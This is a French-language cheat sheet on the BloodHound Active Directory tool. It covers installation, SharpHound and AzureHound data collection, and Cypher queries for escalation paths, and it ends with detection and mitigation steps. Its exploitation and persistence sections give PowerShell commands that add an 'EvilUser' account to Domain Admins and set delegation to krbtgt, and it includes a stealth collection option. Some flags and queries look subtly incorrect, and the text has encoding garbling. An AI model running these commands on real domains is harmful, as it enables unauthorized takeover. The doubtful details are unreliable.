---
title: BloodHound
date: "2025-07-15"
draft: false
---

# ðŸ©¸ BloodHound - Cheat Sheet

## ðŸŽ¯ Vue d'ensemble
BloodHound est un outil d'analyse de sÃ©curitÃ© Active Directory qui utilise des graphiques pour identifier et exploiter les relations complexes entre les objets AD pour l'escalade de privilÃ¨ges.

---

## ðŸ” Installation et Configuration

### Installation de BloodHound
```bash
# Installation via apt (Kali Linux)
# Pourquoi : Installer BloodHound sur des systÃ¨mes Debian/Ubuntu
sudo apt update
sudo apt install bloodhound

# Installation via git
# Pourquoi : Obtenir la derniÃ¨re version depuis GitHub
git clone https://github.com/BloodHoundAD/BloodHound.git
cd BloodHound
sudo apt install neo4j
```

### Configuration de Neo4j
```bash
# DÃ©marrer Neo4j
# Pourquoi : Base de donnÃ©es graphique nÃ©cessaire pour BloodHound
sudo neo4j start
sudo neo4j status

# Configuration de la base de donnÃ©es
# Pourquoi : Configurer les paramÃ¨tres de connexion
# URL: bolt://localhost:7687
# Username: neo4j
# Password: bloodhound
```

### Installation des Collecteurs
```bash
# SharpHound (Windows)
# Pourquoi : Collecteur principal pour Windows
# TÃ©lÃ©charger depuis: https://github.com/BloodHoundAD/BloodHound/releases
# SharpHound.exe ou SharpHound.ps1

# AzureHound (Azure AD)
# Pourquoi : Collecteur pour les environnements Azure AD
# TÃ©lÃ©charger depuis: https://github.com/BloodHoundAD/AzureHound/releases
```

---

## ðŸ› ï¸ Collecte de DonnÃ©es

### Collecte avec SharpHound
```powershell
# Collecte complÃ¨te
# Pourquoi : Collecter toutes les donnÃ©es AD disponibles
.\SharpHound.exe -c All

# Collecte spÃ©cifique
# Pourquoi : Collecter seulement certains types de donnÃ©es
.\SharpHound.exe -c Group,Computer,User

# Collecte avec exfiltration
# Pourquoi : Envoyer les donnÃ©es directement Ã  BloodHound
.\SharpHound.exe -c All -URI http://BLOODHOUND_IP:7474

# Collecte silencieuse
# Pourquoi : Ã‰viter la dÃ©tection pendant la collecte
.\SharpHound.exe -c All -Stealth
```

### Collecte avec PowerShell
```powershell
# Import et exÃ©cution
# Pourquoi : Utiliser PowerShell pour exÃ©cuter SharpHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Collecte avec options avancÃ©es
# Pourquoi : Personnaliser la collecte selon les besoins
Invoke-BloodHound -CollectionMethod All -ExcludeDomainControllers -ExcludeLocalAdmin
```

### Collecte Azure AD
```powershell
# Collecte Azure AD
# Pourquoi : Collecter les donnÃ©es d'Azure Active Directory
.\AzureHound.exe -u username@domain.com -p password

# Collecte avec token
# Pourquoi : Utiliser un token d'authentification pour Azure
.\AzureHound.exe -t "access_token_here"
```

---

## ðŸ”§ Analyse avec BloodHound

### RequÃªtes Cypher de Base
```cypher
// Trouver tous les utilisateurs avec des privilÃ¨ges d'admin de domaine
# Pourquoi : Identifier les comptes avec des privilÃ¨ges Ã©levÃ©s
MATCH (u:User {admincount:true}) RETURN u

// Trouver les chemins d'escalade de privilÃ¨ges
# Pourquoi : Identifier les chemins pour obtenir des privilÃ¨ges Ã©levÃ©s
MATCH p=shortestPath((u:User)-[*1..]->(d:Domain {name:"DOMAIN.LOCAL"})) RETURN p

// Trouver les utilisateurs avec des droits de dÃ©lÃ©gation
# Pourquoi : Identifier les comptes avec des dÃ©lÃ©gations Kerberos
MATCH (u:User)-[:AllowedToDelegate]->(c:Computer) RETURN u,c
```

### RequÃªtes AvancÃ©es
```cypher
// Trouver les chemins vers les groupes d'administrateurs
# Pourquoi : Identifier les chemins d'escalade vers les groupes admin
MATCH p=(u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS"}) RETURN p

// Trouver les comptes avec des mots de passe jamais expirÃ©s
# Pourquoi : Identifier les comptes avec des mots de passe persistants
MATCH (u:User {pwdneverexpires:true}) RETURN u

// Trouver les relations de propriÃ©tÃ©
# Pourquoi : Identifier qui possÃ¨de quels objets
MATCH (u:User)-[:Owns]->(o) RETURN u,o
```

### RequÃªtes de DÃ©tection
```cypher
// Trouver les comptes de service avec des SPNs
# Pourquoi : Identifier les comptes de service pour Kerberoasting
MATCH (u:User)-[:HasSPN]->(s:SPN) RETURN u,s

// Trouver les comptes avec des droits de rÃ©plication
# Pourquoi : Identifier les comptes pouvant effectuer DCSync
MATCH (u:User)-[:ReplicateDirectoryChanges]->(d:Domain) RETURN u,d

// Trouver les dÃ©lÃ©gations non contraintes
# Pourquoi : Identifier les dÃ©lÃ©gations dangereuses
MATCH (u:User)-[:AllowedToDelegate]->(c:Computer) WHERE c.primarygroup = "DOMAIN COMPUTERS" RETURN u,c
```

---

## ðŸŽ¯ Techniques d'Exploitation

### Escalade de PrivilÃ¨ges
```powershell
# Utilisation des chemins trouvÃ©s
# Pourquoi : Exploiter les chemins d'escalade identifiÃ©s par BloodHound
# Exemple: Ajouter un utilisateur Ã  un groupe avec des privilÃ¨ges
Add-ADGroupMember -Identity "DOMAIN ADMINS" -Members "eviluser"

# Exploitation des dÃ©lÃ©gations
# Pourquoi : Exploiter les dÃ©lÃ©gations Kerberos identifiÃ©es
# Utiliser Rubeus ou Impacket pour l'exploitation
```

### Persistance
```powershell
# CrÃ©ation de comptes persistants
# Pourquoi : Maintenir l'accÃ¨s aprÃ¨s l'escalade de privilÃ¨ges
New-ADUser -Name "EvilUser" -AccountPassword (ConvertTo-SecureString "EvilPass123!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "DOMAIN ADMINS" -Members "EvilUser"

# Modification des ACLs
# Pourquoi : Modifier les permissions pour maintenir l'accÃ¨s
Set-ADObject -Identity "CN=EvilUser,CN=Users,DC=domain,DC=local" -Add @{msDS-AllowedToDelegateTo="krbtgt/DOMAIN.LOCAL"}
```

---

## ðŸ” Post-Exploitation

### Analyse des DonnÃ©es CollectÃ©es
```bash
# Import des donnÃ©es dans BloodHound
# Pourquoi : Analyser les donnÃ©es collectÃ©es dans l'interface graphique
# 1. Ouvrir BloodHound
# 2. Importer les fichiers .zip collectÃ©s
# 3. Analyser les graphiques gÃ©nÃ©rÃ©s

# Export des rÃ©sultats
# Pourquoi : Exporter les rÃ©sultats pour documentation
# Utiliser l'interface BloodHound pour exporter les graphiques
```

### GÃ©nÃ©ration de Rapports
```powershell
# GÃ©nÃ©ration de rapports automatiques
# Pourquoi : CrÃ©er des rapports dÃ©taillÃ©s des vulnÃ©rabilitÃ©s trouvÃ©es
# Utiliser les fonctionnalitÃ©s de rapport de BloodHound

# Export des chemins critiques
# Pourquoi : Documenter les chemins d'escalade critiques
# Utiliser l'interface pour exporter les chemins identifiÃ©s
```

---

## ðŸ›¡ï¸ Contre-Mesures

### DÃ©tection
```powershell
# Surveillance des requÃªtes BloodHound
# Pourquoi : DÃ©tecter l'utilisation de BloodHound dans l'environnement
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Message -like "*BloodHound*"}

# Surveillance des collecteurs
# Pourquoi : DÃ©tecter l'exÃ©cution des collecteurs BloodHound
Get-Process | Where-Object {$_.ProcessName -like "*SharpHound*"}
```

### Mitigation
```powershell
# RÃ©duction des privilÃ¨ges
# Pourquoi : RÃ©duire les privilÃ¨ges excessifs identifiÃ©s
Remove-ADGroupMember -Identity "DOMAIN ADMINS" -Members "user_with_excessive_privileges"

# Correction des dÃ©lÃ©gations
# Pourquoi : Corriger les dÃ©lÃ©gations dangereuses
Set-ADObject -Identity "CN=User,CN=Users,DC=domain,DC=local" -Clear "msDS-AllowedToDelegateTo"
```

### Configuration SÃ©curisÃ©e
```powershell
# Configuration des politiques de sÃ©curitÃ©
# Pourquoi : Configurer des politiques pour limiter les escalades
# GPO: Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment
# "Access this computer from the network" = Administrators, Authenticated Users
```

---

## ðŸ“š Ressources

- **BloodHound GitHub** : https://github.com/BloodHoundAD/BloodHound
- **BloodHound Documentation** : https://bloodhound.readthedocs.io/
- **BloodHound Cypher Queries** : https://github.com/BloodHoundAD/BloodHound/wiki/Cypher-Queries
- **BloodHound Training** : https://bloodhound.readthedocs.io/en/latest/training/

---

_DerniÃ¨re mise Ã  jour : 15 juillet 2025_
